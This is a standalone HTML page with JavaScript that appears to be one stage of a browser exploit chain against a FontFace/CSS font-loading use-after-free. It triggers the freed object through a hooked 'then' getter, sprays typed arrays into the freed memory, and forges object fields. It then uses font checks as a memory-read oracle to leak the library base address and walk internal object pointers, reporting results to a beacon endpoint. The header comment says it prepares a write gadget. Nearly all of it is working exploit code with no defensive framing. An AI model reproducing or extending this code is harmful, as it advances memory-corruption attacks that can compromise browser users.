<!--
  p811: addrof-read — layout verify + pointer chase

  Goal: Verify FontFace object layout, chase m_backing → CSSFontFace,
  m_loadedPromise → DOMPromiseProxy, m_wrapper → JSC bridge.
  Prepares for COOP write gadget targeting.

  FO = CSSFontFaceClient subobject = FontFace_base + 0x20
  (confirmed: FO+0x00 = VP = 0x724DB28 in p809)

  Layout hypothesis (FontFace object relative to FO):
    FO-0x20 = PV (primary vtable)
    FO-0x18 = refcount + padding
    FO-0x10 = scriptExecutionContext
    FO-0x08 = ActiveDOMObject state
    FO+0x00 = VP (secondary vtable) [confirmed M]
    FO+0x08 = weak_ptr state
    FO+0x10 = m_backing (Ref<CSSFontFace>) [I → verify]
    FO+0x18 = m_loadedPromise (UniqueRef<LoadedPromise>) [I → verify]
    FO+0x20 = m_mayLoadedPromiseBeScriptObservable (bool)

  Budget: 14 syncRead16 reads (max proven safe: 22)
  CRASH_CLASS: LOW (heap + .rodata only, XO-guarded)
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p811 Layout Verify</title></head>
<body>
<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
<pre id="out" style="font:11px monospace;white-space:pre-wrap">p811 — layout verify + pointer chase</pre>
<script>
'use strict';
var O=document.getElementById('out');
var UID=Math.random().toString(36).slice(2,8).toUpperCase();

function b(m){try{O.textContent+='\n'+m;}catch(e){}
  try{navigator.sendBeacon('/beacon/P811-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID);}catch(e){}}
function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P811-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}

function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
var K=qint('k',32), PW=qint('pw',80), SI=qint('si',0);
var SIZE=192, fired=false, faces=null;
var SKIPJ=-1;
var RVA_VP=0x724DB28n;
var RVA_PV=0x724DAC0n;
var TEXT_LO=0x4000n, TEXT_HI=0x6AD7000n;

/* --- primitives --- */
function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
function hex(x){return '0x'+x.toString(16);}
function readU64(h,off){
  var s=h.slice(off*2,off*2+16);if(!/^[0-9a-f]{16}$/.test(s))return 0n;
  return BigInt('0x'+s.match(/../g).reverse().join(''));
}

function isXO(addr,base){
  if(base===0n||addr<=base)return false;
  var rva=addr-base;
  return rva>=TEXT_LO&&rva<TEXT_HI;
}
function classify(addr,base){
  if(addr===0n)return 'NULL';
  if(addr<0x1000n)return 'LOW';
  if(base>0n&&addr>=base){
    var rva=addr-base;
    if(rva<TEXT_LO)return 'HDR';
    if(rva<TEXT_HI)return 'XO';
    if(rva<0x7400000n)return 'RO';
  }
  if(addr>=0x800000000n&&addr<0x900000000n)return 'IMG';
  if(addr>=0x1000000000n)return 'HEAP';
  return 'UNK';
}

/* --- crash-loop guard --- */
if(/[?&]reset=1/.test(location.search)){
  try{var ks=Object.keys(localStorage);for(var ri=0;ri<ks.length;ri++){if(ks[ri].indexOf('p811')===0)localStorage.removeItem(ks[ri]);}}catch(e){}
  bs('RESET');location.replace(location.pathname+'?_='+Date.now());
}
var CK='p811_tries';
var MAX_TRIES=20,tries=0;
try{tries=parseInt(localStorage.getItem(CK)||'0',10);}catch(e){}
var GUARD_HALT=false;
if(tries>=MAX_TRIES){GUARD_HALT=true;b('LOOP-GUARD-'+tries);verd('bad','CRASH LOOP ('+tries+')');
  setTimeout(function(){try{localStorage.removeItem(CK);}catch(e){}location.replace('/?_='+Date.now());},8000);}
else{
  try{localStorage.setItem(CK,String(tries+1));}catch(e){}
  b('VER-P811v1');b('BOOT-'+UID+',try='+(tries+1));
}

/* ============================================================
   PHASE 1: UAF trigger + spray
   ============================================================ */
function start(){
  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
  try{document.fonts.add(vf);}catch(e){}
  try{void vf.loaded;}catch(e){}
  var fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);

  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
    if(fired)return undefined;fired=true;
    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
    try{document.body.offsetHeight;}catch(e){}
    window.__sp=[];
    for(var k=0;k<K;k++){
      var w=new Uint8Array(new ArrayBuffer(SIZE));
      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
      window.__sp.push(w);
    }
    return undefined;
  },set:function(){}});

  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
                                               function(e){b('RJ-'+String(e&&e.name));});
  setTimeout(function(){if(!faces)b('NOFACES');},1500);
}

/* ============================================================
   PHASE 2: walk chain → BASE + extract FO internals
   ============================================================ */
function phase(){
  var bufs=[],bufl1=[],L1=0n,L2=0n,rawL=null;

  for(var i=0;i<window.__sp.length;i++){
    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
    if(a>0x1000000000n){bufs.push([window.__sp[i],c]);bufl1.push(a);if(!rawL)rawL=[a,c];}
  }
  if(rawL){L1=rawL[0];L2=rawL[1];}
  b('L1-'+hex(L1));b('L2-'+hex(L2));
  if(!bufs.length||L2===0n){b('NOLEAK');verd('bad','NOLEAK');setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},3000);return;}

  for(var ib=0;ib<bufs.length;ib++){var vb=bufs[ib][0];vb[0]=2;put64(vb,0x08,bufs[ib][1]);vb[0x10]=0;vb[0x82]=0;}
  b('FORGED-'+bufs.length);

  setTimeout(function(){
    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
    b('FAMILY-OK');
    setTimeout(function(){
      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
      b('ADD-OK');
      setTimeout(function(){
        var fam=null,zi=-1;
        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;window.__zi=q;break;}}
        b('INTABLE-'+fam);
        if(!fam){b('NOTIN');verd('bad','NOTIN');return;}
        for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=1;bufs[is2][0][0x2C]=1;}

        /* --- oracle functions --- */
        var self=0n,selfFound=false;
        function setR(t){for(var ir=0;ir<bufs.length;ir++){if(SKIPJ>=0&&bufs[ir][0]===window.__sp[SKIPJ])continue;put64(bufs[ir][0],0x20,t);}}
        function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}
        function boundary(tgt){
          setR(tgt);
          if(chk(0)!==true)return -1;
          var lo=0,hi=0x10FFFF,res=-1;
          while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)break;if(r===true){res=mid;lo=mid+1;}else hi=mid-1;}
          return res;
        }

        /* --- forgeRead --- */
        function forgeRead(daddr,dlen){
          for(var ib2=0;ib2<window.__sp.length;ib2++){
            var vb2=window.__sp[ib2];if(!vb2)continue;
            if(SKIPJ>=0&&ib2===SKIPJ)continue;
            if(selfFound){put64(vb2,0x08,self+0x70n);vb2[0x10]=0;}
            put32(vb2,0x30,4);put32(vb2,0x34,dlen);put64(vb2,0x38,daddr);put32(vb2,0x40,4);
            vb2[0x44]=0x7A;vb2[0x45]=0x7A;vb2[0x46]=0x71;
            put32(vb2,0x70,4);
            put32(vb2,0x74,0x10);vb2[0x78]=14;vb2[0x79]=0;
            if(selfFound)put64(vb2,0x7A,self+0x90n);
            put32(vb2,0x90,3);put32(vb2,0x94,72);
            if(selfFound)put64(vb2,0x98,self+0x30n);
          }
        }
        function dec(s,lim){
          var by=[],q2=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q2;
          while(k<e&&by.length<lim){var ch=s.charAt(k);
            if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
              if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
              else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
            else{by.push(s.charCodeAt(k));k++;}}
          var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
        }
        function readStyle(){
          if(zi<0)return '';
          try{return dec(String(faces[zi].style),128);}catch(e){return 'THROW';}
        }
        function restoreAll(snap){
          for(var ib3=0;ib3<window.__sp.length;ib3++){
            var vb3=window.__sp[ib3];if(!vb3)continue;
            if(SKIPJ>=0&&ib3===SKIPJ)continue;
            for(var dd2=0;dd2<SIZE;dd2++)vb3[dd2]=snap[dd2];
          }
        }
        function restoreAndForge(snap,daddr,dlen){
          restoreAll(snap);
          forgeRead(daddr,dlen);
        }
        function syncRead16(snap,addr){
          restoreAndForge(snap,addr,16);
          var rd='';
          try{rd=readStyle();}catch(e){rd='';}
          restoreAll(snap);
          return rd;
        }

        /* --- oracle validation --- */
        var t1=-1,l2i=-1,oracleOff=0n;
        var ORACLE_OFFSETS=[0x04n,0x07n,0x03n,0x00n];
        for(var q8=0;q8<bufs.length;q8++){
          L1=bufl1[q8];L2=bufs[q8][1];
          for(var oi=0;oi<ORACLE_OFFSETS.length;oi++){
            setR(L2+ORACLE_OFFSETS[oi]);
            t1=boundary(L2+ORACLE_OFFSETS[oi]);
            if(t1>=0){oracleOff=ORACLE_OFFSETS[oi];break;}
          }
          if(t1>=0){l2i=q8;break;}
        }
        if(l2i>0)b('L2SEL-'+l2i);
        if(l2i<0){L1=bufl1[0];L2=bufs[0][1];}
        var oracleAlive=(t1>=0);
        for(var ipd=0;ipd<bufs.length;ipd++){var vpd=bufs[ipd][0];
          vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
          vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
        if(!oracleAlive)b('A-DEAD');
        else b('ORACLE-ALIVE-off='+hex(oracleOff));

        /* --- PH3: Self scan --- */
        if(!selfFound){
          var b2Ref=Number((L2>>16n)&0xFFn);
          var b4Ref=Number((L2>>32n)&0xFFn);
          if(!b4Ref)b4Ref=0x10;
          var B4s=[b4Ref];
          var b4all=[0x10,0x08];for(var q8b=0x09;q8b<=0x0F;q8b++)b4all.push(q8b);for(var q9=0x11;q9<=0x1F;q9++)b4all.push(q9);
          for(var qw=0;qw<b4all.length;qw++){if(b4all[qw]!==b4Ref)B4s.push(b4all[qw]);}
          var b2s=[];for(var q5=0;q5<256;q5++)b2s.push(q5);
          b2s.sort(function(x,y){return Math.abs(x-b2Ref)-Math.abs(y-b2Ref);});
          var b2h=0x38;try{b2h=parseInt(localStorage.getItem('p811_b2')||'56',10);}catch(e){}
          var hix=b2s.indexOf(b2h);if(hix>0){b2s.splice(hix,1);b2s.unshift(b2h);}
          var b1Ref=Number((L2>>8n)&0xFFn);
          var b1s=[];for(var q5b=0;q5b<256;q5b++)b1s.push(q5b);
          b1s.sort(function(x,y){return Math.abs(x-b1Ref)-Math.abs(y-b1Ref);});
          var b0a=[];for(var q6=0;q6<16;q6++)b0a.push(q6*16);
          var n3=0,MAX_PH3=30000;
          bs('PH3-START');
          for(var i8=0;i8<B4s.length&&!selfFound&&n3<MAX_PH3;i8++){
            for(var i7=0;i7<b2s.length&&!selfFound&&n3<MAX_PH3;i7++){
              for(var q7=0;q7<b1s.length&&!selfFound&&n3<MAX_PH3;q7++){
                for(var i6=0;i6<b0a.length&&!selfFound&&n3<MAX_PH3;i6++){
                  var sc=BigInt(b0a[i6])|(BigInt(b1s[q7])<<8n)|(BigInt(b2s[i7])<<16n)|(BigInt(B4s[i8])<<32n);
                  setR(sc+0x38n);n3++;
                  if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
                    self=sc;selfFound=true;
                  }
                }
              }
            }
          }
        }
        if(!selfFound){
          for(var idN=0;idN<faces.length;idN++){try{document.fonts.delete(faces[idN]);}catch(e){}}
          b('NOSELF-'+n3);verd('bad','NOSELF');
          setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},2000);
          return;
        }
        b('SELF-'+hex(self));
        try{localStorage.setItem('p811_b2',String(Number((self>>16n)&0xFFn)));}catch(e){}

        /* VTAB search (skip-index) */
        var VTAB=0n;
        for(var sv=1;sv<=256&&VTAB===0n;sv++){
          var cd=self-BigInt(sv*64);
          setR(cd);
          if(chk(0x1000)===true&&chk(0x1001)===false){
            var jj=Number(boundary(cd))-0x1000;
            if(jj>=0&&jj<K){VTAB=cd;SKIPJ=jj;break;}
          }
        }
        if(VTAB===0n){
          for(var sv2=1;sv2<=256&&VTAB===0n;sv2++){
            var cu=self+BigInt(sv2*64);
            setR(cu);
            if(chk(0x1000)===true&&chk(0x1001)===false){
              var jj2=Number(boundary(cu))-0x1000;
              if(jj2>=0&&jj2<K){VTAB=cu;SKIPJ=jj2;break;}
            }
          }
        }
        b('VTAB-'+hex(VTAB));

        for(var ir2=0;ir2<bufs.length;ir2++){put64(bufs[ir2][0],0x20,self+0x38n);}

        /* ============================================================
           WALK CHAIN: W1-W3 → VP → BASE → FO internals
           ============================================================ */
        bs('DEL-PRE');
        for(var id=0;id<faces.length;id++){try{document.fonts.delete(faces[id]);}catch(e){}}
        bs('DEL-OK');

        var preSnap=new Uint8Array(SIZE);
        if(bufs.length>0)for(var ps0=0;ps0<SIZE;ps0++)preSnap[ps0]=bufs[0][0][ps0];

        bs('W1-PRE');
        forgeRead(L1-0x10n,80);
        var cachedHT='';
        try{cachedHT=dec(String(faces[zi].style),128);}catch(e){bs('W1-THROW');}
        bs('W1-len='+cachedHT.length);
        for(var pr0=0;pr0<window.__sp.length;pr0++){var prv=window.__sp[pr0];if(!prv)continue;
          if(SKIPJ>=0&&pr0===SKIPJ)continue;
          for(var pr1=0;pr1<SIZE;pr1++)prv[pr1]=preSnap[pr1];}

        var snap2=preSnap;
        var IM=0n,FO=0n,VP=0n,BASE=0n;
        var mBacking=0n,mLoadedPromise=0n,fo08=0n;

        if(cachedHT.length>=160){
          var hw=cachedHT;
          var seen=0;
          for(var gb=2;gb<10;gb++){
            var hb=hw.slice(gb*16,gb*16+16);
            if(/^[0-9a-f]{16}$/.test(hb)){
              var cv=BigInt('0x'+hb.match(/../g).reverse().join(''));
              if(cv>0x1000000000n&&cv<0xFFFFFFFFFFFFFFFFn){if(seen===SI){IM=cv;break;}seen++;}
            }
          }
          bs('W1-IM='+hex(IM));
          if(IM!==0n){
            restoreAndForge(snap2,IM+8n,16);
            var h2=readStyle();
            if(h2.length>=16)FO=readU64(h2,0);
            bs('W2-FO='+hex(FO)+',len='+h2.length);

            if(FO>0x1000000000n){
              restoreAndForge(snap2,FO,32);
              var h3=readStyle();
              if(h3.length>=16)VP=readU64(h3,0);
              if(h3.length>=32){fo08=readU64(h3,8);}
              if(h3.length>=48){mBacking=readU64(h3,16);}
              if(h3.length>=64){mLoadedPromise=readU64(h3,24);}
              bs('W3-VP='+hex(VP)+',fo08='+hex(fo08)+',mB='+hex(mBacking)+',mLP='+hex(mLoadedPromise));
              if(!selfFound&&fo08>0x1000000000n&&fo08<0x10000000000n){
                self=fo08;selfFound=true;bs('SELF-W3-FALLBACK='+hex(self));
              }
            }
          }
        }

        restoreAll(snap2);
        if(VP===0n||VP<=0x100000000n){
          bs('WALK-FAIL');verd('bad','WALK FAIL VP='+hex(VP));return;
        }
        BASE=VP-RVA_VP;
        bs('WALK-OK:BASE='+hex(BASE)+',FO='+hex(FO));
        bs('PUMP-1');bs('PUMP-2');

        var nReads=0;
        var FB=FO-0x20n;

        /* ============================================================
           PHASE LV: LAYOUT VERIFY
           FO = CSSFontFaceClient subobject = FontFace_base + 0x20
           ============================================================ */
        bs('LV-START');

        /* LV-1: FontFace base → PV + refcount */
        var pvRead=0n,rcRead=0n;
        if(!isXO(FB,BASE)){
          var lv1=syncRead16(snap2,FB);nReads++;
          if(lv1.length>=16){pvRead=readU64(lv1,0);}
          if(lv1.length>=32){rcRead=readU64(lv1,8);}
          var pvOK=(pvRead===BASE+RVA_PV);
          bs('LV1-PV='+hex(pvRead)+',rc='+hex(rcRead)+',pvOK='+pvOK);
        }else{bs('LV1-SKIP-XO');}

        /* LV-2: FontFace+0x10 → scriptExecutionContext + state */
        var secRead=0n,adoRead=0n;
        if(!isXO(FB+0x10n,BASE)){
          var lv2=syncRead16(snap2,FB+0x10n);nReads++;
          if(lv2.length>=16){secRead=readU64(lv2,0);}
          if(lv2.length>=32){adoRead=readU64(lv2,8);}
          bs('LV2-SEC='+hex(secRead)+',c='+classify(secRead,BASE)+',ADO='+hex(adoRead)+',c='+classify(adoRead,BASE));
        }else{bs('LV2-SKIP-XO');}

        /* LV-3: W3 already gave us FO+0x00..0x1F */
        var vpOK=(VP===BASE+RVA_VP);
        bs('LV3-VP='+hex(VP)+',vpOK='+vpOK+',fo08='+hex(fo08)+',c='+classify(fo08,BASE));
        bs('LV4-mB='+hex(mBacking)+',c='+classify(mBacking,BASE)+',mLP='+hex(mLoadedPromise)+',c='+classify(mLoadedPromise,BASE));

        /* LV-5: FontFace+0x40 → m_mayLoadedPromise + end of object */
        var mayObs=0n,endField=0n;
        if(!isXO(FO+0x20n,BASE)){
          var lv5=syncRead16(snap2,FO+0x20n);nReads++;
          if(lv5.length>=16){mayObs=readU64(lv5,0);}
          if(lv5.length>=32){endField=readU64(lv5,8);}
          bs('LV5-may='+hex(mayObs)+',end='+hex(endField));
        }else{bs('LV5-SKIP-XO');}

        /* ============================================================
           PHASE MB: Follow m_backing → CSSFontFace
           ============================================================ */
        bs('MB-START');
        var csVtab=0n,csRef=0n,mWrapper=0n;

        if(mBacking>0x1000000000n&&!isXO(mBacking,BASE)){

          /* MB-1: CSSFontFace vtable + refcount */
          var mb1=syncRead16(snap2,mBacking);nReads++;
          if(mb1.length>=16){csVtab=readU64(mb1,0);}
          if(mb1.length>=32){csRef=readU64(mb1,8);}
          bs('MB1-vtab='+hex(csVtab)+',c='+classify(csVtab,BASE)+',ref='+hex(csRef));

          /* MB-2: CSSFontFace+0x10 → m_propertiesOrCSSConnection */
          var propConn=0n,propConn8=0n;
          if(!isXO(mBacking+0x10n,BASE)){
            var mb2=syncRead16(snap2,mBacking+0x10n);nReads++;
            if(mb2.length>=16){propConn=readU64(mb2,0);}
            if(mb2.length>=32){propConn8=readU64(mb2,8);}
            bs('MB2-prop='+hex(propConn)+',c='+classify(propConn,BASE)+',p8='+hex(propConn8)+',c='+classify(propConn8,BASE));
          }else{bs('MB2-SKIP-XO');}

          /* MB-3: CSSFontFace+0x60 → m_clients (WeakHashSet) */
          var clients=0n,clients8=0n;
          if(!isXO(mBacking+0x60n,BASE)){
            var mb3=syncRead16(snap2,mBacking+0x60n);nReads++;
            if(mb3.length>=16){clients=readU64(mb3,0);}
            if(mb3.length>=32){clients8=readU64(mb3,8);}
            bs('MB3-clients='+hex(clients)+',c='+classify(clients,BASE)+',c8='+hex(clients8));
          }else{bs('MB3-SKIP-XO');}

          /* MB-4: CSSFontFace+0x70 → m_wrapper (WeakPtr<FontFace>) */
          if(!isXO(mBacking+0x70n,BASE)){
            var mb4=syncRead16(snap2,mBacking+0x70n);nReads++;
            var mw08=0n;
            if(mb4.length>=16){mWrapper=readU64(mb4,0);}
            if(mb4.length>=32){mw08=readU64(mb4,8);}
            bs('MB4-wrap='+hex(mWrapper)+',c='+classify(mWrapper,BASE)+',mw08='+hex(mw08)+',c='+classify(mw08,BASE));
          }else{bs('MB4-SKIP-XO');}

          /* MB-5: CSSFontFace+0x80..0x8F → m_status at byte 0x8a */
          if(!isXO(mBacking+0x80n,BASE)){
            var mb5=syncRead16(snap2,mBacking+0x80n);nReads++;
            if(mb5.length>=20){
              var statusByte=parseInt(mb5.slice(20,22),16);
              bs('MB5-raw='+mb5.slice(0,32)+',status@0a='+statusByte);
            }else{
              bs('MB5-short='+mb5.length);
            }
          }else{bs('MB5-SKIP-XO');}

        }else{
          bs('MB-SKIP:mB='+hex(mBacking)+',xo='+isXO(mBacking,BASE));
        }

        /* ============================================================
           PHASE LP: Follow m_loadedPromise → DOMPromiseProxy
           ============================================================ */
        bs('LP-START');
        var promHdr=0n,promHdr8=0n,prom10=0n,prom18=0n;

        if(mLoadedPromise>0x1000000000n&&!isXO(mLoadedPromise,BASE)){

          /* LP-1: Promise header */
          var lp1=syncRead16(snap2,mLoadedPromise);nReads++;
          if(lp1.length>=16){promHdr=readU64(lp1,0);}
          if(lp1.length>=32){promHdr8=readU64(lp1,8);}
          bs('LP1-hdr='+hex(promHdr)+',c='+classify(promHdr,BASE)+',h8='+hex(promHdr8)+',c='+classify(promHdr8,BASE));

          /* LP-2: Promise+0x10 */
          if(!isXO(mLoadedPromise+0x10n,BASE)){
            var lp2=syncRead16(snap2,mLoadedPromise+0x10n);nReads++;
            if(lp2.length>=16){prom10=readU64(lp2,0);}
            if(lp2.length>=32){prom18=readU64(lp2,8);}
            bs('LP2-p10='+hex(prom10)+',c='+classify(prom10,BASE)+',p18='+hex(prom18)+',c='+classify(prom18,BASE));
          }else{bs('LP2-SKIP-XO');}

        }else{
          bs('LP-SKIP:mLP='+hex(mLoadedPromise)+',xo='+isXO(mLoadedPromise,BASE));
        }

        /* ============================================================
           PHASE MW: Follow m_wrapper → JSC bridge
           ============================================================ */
        bs('MW-START');
        if(mWrapper>0x1000000000n&&!isXO(mWrapper,BASE)){
          var mw1=syncRead16(snap2,mWrapper);nReads++;
          var wrapQ0=0n,wrapQ1=0n;
          if(mw1.length>=16){wrapQ0=readU64(mw1,0);}
          if(mw1.length>=32){wrapQ1=readU64(mw1,8);}
          bs('MW1-q0='+hex(wrapQ0)+',c='+classify(wrapQ0,BASE)+',q1='+hex(wrapQ1)+',c='+classify(wrapQ1,BASE));

          if(wrapQ0>0n){
            var dist=wrapQ0>FO?wrapQ0-FO:FO-wrapQ0;
            if(dist<0x1000n)bs('MW-BRIDGE:dist='+hex(dist)+',backToFO=true');
          }
        }else{
          bs('MW-SKIP:wrap='+hex(mWrapper));
        }

        /* ============================================================
           DONE — summary beacon
           ============================================================ */
        try{localStorage.removeItem(CK);}catch(e){}

        var sum='RESULT:nR='+nReads+',BASE='+hex(BASE)+',FO='+hex(FO)+',FB='+hex(FB);
        sum+=',pvOK='+(pvRead===BASE+RVA_PV)+',vpOK='+vpOK;
        sum+=',mB='+hex(mBacking)+',mLP='+hex(mLoadedPromise);
        if(csVtab)sum+=',csVt='+hex(csVtab);
        if(mWrapper)sum+=',wrap='+hex(mWrapper);
        if(promHdr)sum+=',pHdr='+hex(promHdr);
        bs(sum);

        var html='LAYOUT VERIFY DONE<br>'+nReads+' reads, BASE='+hex(BASE);
        html+='<br>PV '+(pvRead===BASE+RVA_PV?'OK':'MISMATCH')+' VP '+(vpOK?'OK':'MISMATCH');
        html+='<br>m_backing='+hex(mBacking)+' ('+classify(mBacking,BASE)+')';
        html+='<br>m_loadedPromise='+hex(mLoadedPromise)+' ('+classify(mLoadedPromise,BASE)+')';
        if(mWrapper)html+='<br>m_wrapper='+hex(mWrapper)+' ('+classify(mWrapper,BASE)+')';
        verd('ok',html);

      },60);
    },40);
  },60);
}

if(!GUARD_HALT){
if(document.readyState==='complete'||document.readyState==='interactive')
  setTimeout(start,2000);
else document.addEventListener('DOMContentLoaded',function(){setTimeout(start,2000);});
}
</script></body></html>
